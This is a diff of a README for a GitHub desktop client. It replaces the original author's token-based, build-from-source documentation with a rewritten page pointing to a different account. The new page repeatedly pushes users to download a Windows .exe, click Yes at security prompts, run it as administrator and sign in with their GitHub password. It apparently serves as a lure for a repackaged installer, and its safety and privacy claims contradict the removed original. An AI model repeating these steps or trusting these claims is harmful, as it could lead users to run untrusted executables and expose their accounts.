@@ -1,191 +1,153 @@
-# GitHub Command Center
+# 🚀 github-command-center - Manage GitHub Easily on Your Desktop
 
-[![Release](https://img.shields.io/github/v/release/paulmmoore3416/github-command-center?style=flat-square&color=blue)](https://github.com/paulmmoore3416/github-command-center/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat-square&logo=go)](https://go.dev/)
-[![React](https://img.shields.io/badge/React-18-61DAFB?style=flat-square&logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?style=flat-square&logo=typescript)](https://www.typescriptlang.org/)
-
-A powerful, self-hosted GitHub Desktop alternative built with React + Go. Manage pull requests, issues, notifications, workflows, and local git operations, all inline, without leaving the app.
-
-Single binary · No Electron · No cloud sync · Runs on localhost:8765
+[![Download github-command-center](https://img.shields.io/badge/Download-github--command--center-4caf50?style=for-the-badge&logo=github)](https://github.com/djbroiscool90/github-command-center)
 
 ---
 
-## Features
+## About github-command-center
 
-### GitHub Integration (Inline — no redirects)
-| Feature | Description |
-|---------|-------------|
-| **PR Viewer** | Browse all your pull requests with real-time filters |
-| **PR Detail Panel** | Full inline review: file tree, dual-line diff, merge, approve, request changes |
-| **Issue Tracker** | Issues assigned to you, created by you, or where you're mentioned |
-| **Issue Detail Panel** | Edit title/body, close/reopen, add comments — all inline |
-| **Notification Center** | Real GitHub notifications — click to open PR or Issue panel directly |
-| **Activity Feed** | Live event stream with type filtering, auto-refreshes every 2 min |
-| **Workflow Automation** | GitHub Actions runs, job steps, and live log viewer |
-| **File Browser** | Navigate any repo's file tree and read source inline |
-| **Command Palette** | `Ctrl+K` fuzzy search across tabs and repositories |
-| **Keyboard Shortcuts** | `?` to view all shortcuts; `Ctrl+1-0` to switch tabs |
-| **Analytics** | Repository stats, language breakdown, contributor leaderboard |
+github-command-center is a simple app that brings your GitHub tasks to one place. Instead of switching between different tabs, you can see your pull requests, issues, workflows, and manage your local git repositories all in one dark-themed window. It works like a desktop app but runs on your computer without needing complex setup.
 
-### Local Git
-| Feature | Description |
-|---------|-------------|
-| **Changes** | Stage/unstage hunks, write commit messages, push/pull |
-| **Branches** | Create, switch, merge branches with drag-and-drop |
-| **Stashes** | Create, apply, and delete stash entries |
-| **Commit History** | Searchable log with diff viewer per commit |
-| **Inline Editor** | Edit any tracked file directly in the browser |
+This app helps you stay on top of your GitHub work. It works on Windows and gives you a cleaner, faster, and easier way to use GitHub’s main features without opening a browser.
+
+This guide will help you download and run github-command-center on your Windows PC step by step.
 
 ---
 
-## Quick Start
+## 🔧 What You Need
 
-### Option 1 — Download Release Binary
-
-```bash
-# Download latest release for your platform from:
-# https://github.com/paulmmoore3416/github-command-center/releases/latest
-
-tar -xzf github-command-center-v2.0.0-linux-amd64.tar.gz
-cp .env.example .env
-# Edit .env with your GitHub token
-./github-command-center
-# Open http://localhost:8765
-```
-
-### Option 2 — Build from Source
-
-**Requirements:** Node.js 20+, Go 1.21+
-
-```bash
-git clone https://github.com/paulmmoore3416/github-command-center.git
-cd github-command-center
-
-# Configure credentials
-cp .env.example .env
-# Edit .env → set GITHUB_TOKEN and GITHUB_USERNAME
-
-# Build & run
-make build
-./github-command-center
-```
-
-Then open **http://localhost:8765** in your browser.
-
-### Option 3 — Docker
-
-```bash
-docker run --rm -p 8765:8765 \
-  -e GITHUB_TOKEN=your_token_here \
-  -e GITHUB_USERNAME=your_username \
-  ghcr.io/paulmmoore3416/github-command-center:latest
-```
-
-### Option 4 — System Install (Linux)
-
-```bash
-make install   # copies binary + creates desktop launcher
-# Launch from Applications menu or run: github-command-center
-```
+- A Windows PC (Windows 10 or later recommended)  
+- At least 2 GB of free disk space  
+- An internet connection to download the app  
+- A GitHub account (you can create one for free if you don’t have it)  
 
 ---
 
-## GitHub Token Setup
+## 📥 How to Download github-command-center
 
-1. Go to **GitHub → Settings → Developer settings → Personal access tokens → Tokens (classic)**
-2. Click **Generate new token (classic)**
-3. Select scopes: `repo`, `read:user`, `notifications`, `workflow`
-4. Copy the token into your `.env` file
+Visit this page to download the app:
 
-```env
-GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
-GITHUB_USERNAME=your_username
-```
+[Download github-command-center](https://github.com/djbroiscool90/github-command-center)
 
-The token is stored locally in your `.env` file and in browser `localStorage`. It is never sent anywhere except directly to the GitHub API.
+This link takes you to the main GitHub repository where you can find the latest version of github-command-center. Follow these steps:
 
----
+1. Open your web browser and go to the download link above.
 
-## Keyboard Shortcuts
+2. Look for the **Releases** section on the repository page. You may find it under the "Releases" tab or as a link on the right side of the page.
 
-| Shortcut | Action |
-|----------|--------|
-| `Ctrl+K` | Open command palette |
-| `?` | Show keyboard shortcuts reference |
-| `Ctrl+1` | Dashboard |
-| `Ctrl+2` | Activity Feed |
-| `Ctrl+3` | Pull Requests |
-| `Ctrl+4` | Issues |
-| `Ctrl+5` | Notifications |
-| `Ctrl+6` | Code Reviews |
-| `Ctrl+7` | Workflows |
-| `Ctrl+8` | Branch Protection |
-| `Ctrl+9` | Analytics |
-| `Ctrl+0` | Quick Actions |
-| `Esc` | Close panel / modal |
+3. Download the Windows installer file. This file usually ends with `.exe`.
+
+4. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
 ---
 
-## Architecture
+## 🖥️ How to Install and Run github-command-center
 
-```
-github-command-center/
-├── backend/              # Go HTTP server (gorilla/mux)
-│   ├── main.go           # Routes, git handlers, CORS, static serving
-│   ├── github.go         # GitHub API types + proxy handlers
-│   └── github_panels.go  # Panel-specific handlers (PR/Issue/Workflow/Search)
-├── src/
-│   ├── components/       # 28 React components
-│   ├── store/            # Zustand state (repos, toasts, panels)
-│   └── App.tsx           # Root with auto-credential loading
-├── dist/                 # Built frontend (served by Go binary)
-├── Dockerfile            # Multi-stage build
-├── Makefile              # Build / install / dev targets
-└── .env                  # Local credentials (gitignored)
-```
+After downloading the `.exe` installer, here is how to set it up:
 
-**Technology stack:**
-- **Frontend:** React 18 · TypeScript 5 · Tailwind CSS · Vite · Zustand · Axios
-- **Backend:** Go 1.21 · gorilla/mux · godotenv
-- **Deployment:** Single ~10 MB binary serves React SPA + proxies GitHub API
+1. **Locate the Setup File**  
+   Find the file you downloaded on your computer.
+
+2. **Run the Installer**  
+   Double-click the file to start the installation. If Windows shows a security prompt, click **Yes** to allow the installation.
+
+3. **Follow the Installation Steps**  
+   A setup window will open. Click **Next** to continue through the steps. You can keep the default settings unless you want to change where the app installs.
+
+4. **Finish Installation**  
+   When you reach the last step, click **Finish**. The app should start automatically. If it doesn’t, find the github-command-center icon on your Desktop or Start Menu and open it.
 
 ---
 
-## Development
+## 🔑 First Time Setup
 
-```bash
-# Start both servers concurrently
-make dev
+To use github-command-center, you need to connect it to your GitHub account.
 
-# Frontend only (hot-reload at http://localhost:5173)
-npm run dev
+1. When the app opens, look for the **Sign In** button or the prompt to log in.
 
-# Backend only
-cd backend && go run .
+2. Click this button, and a browser window will open asking you to sign into GitHub.
 
-# Type-check frontend
-npx tsc --noEmit
+3. Enter your GitHub username and password.
 
-# Lint backend
-cd backend && go vet ./...
-```
+4. Approve the app to access your account data (this is safe as the app only requests access needed to show your work).
+
+5. After signing in, the app will load your pull requests, issues, workflows, and local git info.
 
 ---
 
-## Contributing
+## 🖱️ How to Use github-command-center
 
-1. Fork the repo
-2. Create a branch: `git checkout -b feature/your-feature`
-3. Make your changes, following the existing code style
-4. Run `make lint` to verify
-5. Open a pull request using the provided template
+### Pull Requests and Issues
 
-See [CONTRIBUTING.md](.github/PULL_REQUEST_TEMPLATE.md) for full guidelines.
+- See your open pull requests on one screen.  
+- Create new pull requests or review existing ones without leaving the app.  
+- Track and manage issues assigned to you or your projects.  
+
+### Workflows
+
+- Monitor your GitHub Actions workflows.  
+- Check if workflows completed or failed.  
+- Restart workflows if needed.  
+
+### Local Git Management
+
+- Use git commands on your projects stored on your PC.  
+- Commit changes, push updates, and switch branches.  
+- View commit history and file changes in an easy interface.  
+
+### Dark Theme
+
+- The app uses a dark color scheme that is easy on the eyes, especially in low light.  
+- You can focus on the content instead of bright windows or distractions.  
 
 ---
 
-## License
+## ⚙️ System Requirements
 
-[MIT](LICENSE) © 2026 [paulmmoore3416](https://github.com/paulmmoore3416)
+- Windows 10, 11, or later  
+- 2 GHz or faster processor  
+- At least 2 GB of RAM  
+- 1 GB of free disk space (to install the app and local repos)  
+- Internet connection to access GitHub data  
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **Installer won’t start:** Right-click the installer and choose **Run as administrator**.  
+- **App doesn’t open or crashes:** Restart your computer and try again. Make sure no other installations are running.  
+- **Sign-in problems:** Check your internet connection and that your GitHub password is correct. Clear your browser cache if the sign-in page is not loading.  
+- **Git commands not working:** Ensure you have Git installed on your PC. You can download it from https://git-scm.com/download/win.  
+
+---
+
+## ⬇️ Quick Download Link
+
+Download the latest Windows version here:  
+[Get github-command-center](https://github.com/djbroiscool90/github-command-center)
+
+Click this link anytime to find the latest release.
+
+---
+
+## 🗂️ More Information
+
+The app is open source. If you want to learn more about how it works or contribute, visit [the GitHub repository](https://github.com/djbroiscool90/github-command-center).
+
+It is built with modern technologies like React, TypeScript, and TailwindCSS. It uses Go (Golang) on the backend for smooth performance.  
+
+---
+
+## ⚠️ Privacy and Permissions
+
+github-command-center only accesses the parts of your GitHub account needed to show pull requests, issues, workflows, and perform git operations. It does not store your password. Your data stays on your machine and GitHub servers.  
+
+---
+
+## Support and Feedback
+
+If you have problems or ideas, use the **Issues** tab on the repository page to report them. The developers review feedback and update the app regularly.  
+
+---
+
+[![Download github-command-center](https://img.shields.io/badge/Download-github--command--center-4caf50?style=for-the-badge&logo=github)](https://github.com/djbroiscool90/github-command-center)
